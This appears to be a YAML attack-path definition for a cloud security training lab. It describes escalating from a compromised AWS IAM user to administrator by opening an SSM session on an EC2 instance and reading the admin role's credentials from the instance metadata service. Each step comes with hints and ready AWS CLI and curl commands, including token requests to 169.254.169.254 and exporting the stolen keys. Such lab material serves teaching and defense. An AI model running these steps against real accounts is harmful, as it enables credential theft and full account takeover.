attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ssm-001-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has ssm:StartSession permission, allowing it to open interactive
        shell sessions on EC2 instances in the account.

    - id: ec2-instance
      label: "EC2 Instance"
      type: resource
      subType: ec2-instance
      arn: "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx"
      description: >
        This EC2 instance has the SSM agent running and an administrative IAM role
        attached via its instance profile. Once you have an interactive session on
        this instance, you can query the Instance Metadata Service (IMDS) to retrieve
        temporary AWS credentials for the attached admin role.

    - id: target-role
      label: "Admin EC2 Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ssm-001-to-admin-ec2-role"
      description: >
        This IAM role has AdministratorAccess and is attached to the EC2 instance via
        an instance profile. By retrieving its temporary credentials from the IMDS
        endpoint inside the SSM session, you gain full administrative access to the
        AWS account and can operate from your local machine.

  edges:
    - from: starting-principal
      to: ec2-instance
      label: "ssm:StartSession"
      description: >
        Start an interactive shell session on the EC2 instance using SSM Session Manager.
        This provides SSH-like access through the AWS API without requiring network
        connectivity, open ports, or SSH keys.
      hints:
        - "Start by reviewing the policy attached to this user -- what AWS service does the permission reference, and what action does it let you perform?"
        - "Use ec2:DescribeInstances to enumerate running instances. Look at the IamInstanceProfile field on each instance -- it tells you what role is attached."
        - "Use ssm:DescribeInstanceInformation to confirm which instances have the SSM agent running and are reachable. Look for PingStatus = Online."
        - "Check which instance resources this user has ssm:StartSession permission on -- the policy may scope it to a specific instance or use a wildcard."
        - "You will need the AWS Session Manager plugin installed locally for the start-session command to work. It is a separate download from the AWS CLI."
        - "Browse to https://pathfinding.cloud/paths/ssm-001 for full technique details."
      commands:
        - description: "Enumerate running EC2 instances and their attached IAM roles"
          command: "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output table"
        - description: "Confirm SSM agent is online on the target instance"
          command: "aws ssm describe-instance-information --query 'InstanceInformationList[*].[InstanceId,PingStatus,ComputerName]' --output table"
        - description: "Start an interactive session on the target instance"
          command: "aws ssm start-session --target <instance-id>"

    - from: ec2-instance
      to: target-role
      label: "curl IMDS"
      description: >
        From within the interactive SSM session, query the EC2 Instance Metadata Service
        to retrieve the temporary AWS credentials (access key, secret key, session token)
        for the administrative role attached to the instance.
      hints:
        - "Once you have a shell on the instance, there is a well-known internal endpoint accessible only from within the instance that provides identity and credentials."
        - "The instance metadata service (IMDS) is reachable at 169.254.169.254 from inside any EC2 instance."
        - "If IMDSv2 is required, you must first request a session token with a PUT request before querying any metadata endpoints."
        - "Query the IAM security-credentials path under the metadata endpoint to discover the role name, then query that role's path to get temporary credentials."
        - "The response contains AccessKeyId, SecretAccessKey, and Token fields -- export all three as environment variables on your local machine to use these credentials."
      commands:
        - description: "Request an IMDSv2 session token (required if IMDSv2 is enforced)"
          command: "TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null)"
        - description: "Get the role name from IMDS"
          command: "ROLE_NAME=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null) && echo $ROLE_NAME"
        - description: "Retrieve the temporary credentials for the admin role"
          command: "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null"
        - description: "Export the extracted credentials locally and verify admin access"
          command: "export AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> && aws iam list-users --max-items 3"
